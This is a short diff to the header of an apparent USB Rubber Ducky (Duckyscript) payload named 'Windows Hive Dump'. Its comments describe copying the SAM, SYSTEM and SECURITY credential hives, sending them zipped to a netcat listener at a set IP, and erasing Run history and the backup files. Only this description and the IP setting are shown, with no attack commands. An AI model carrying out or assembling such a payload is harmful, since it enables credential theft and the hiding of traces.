@@ -1,7 +1,8 @@
 REM Title: Duckyscript Windows Hive Dump
 REM Author: kipair
 REM Description: This script launches PowerShell as Administrator, pauses PowerShell command history, creates a local backup of the SAM, SYSTEM, and SECURITY hives,
-REM              compresses the backup files into a .ZIP, sends the .ZIP file to a netcat listener, clears Windows Run dialogue box history, and then exits PowerShell.
+REM              compresses the backup files into a .ZIP, sends the .ZIP file to a netcat listener, clears Windows Run dialogue box history, deletes all backup files
+REM              and then exits PowerShell.
 
 REM Change IP and PORT variables according to the netcat listener.
 DEFINE #IP 10.0.0.86
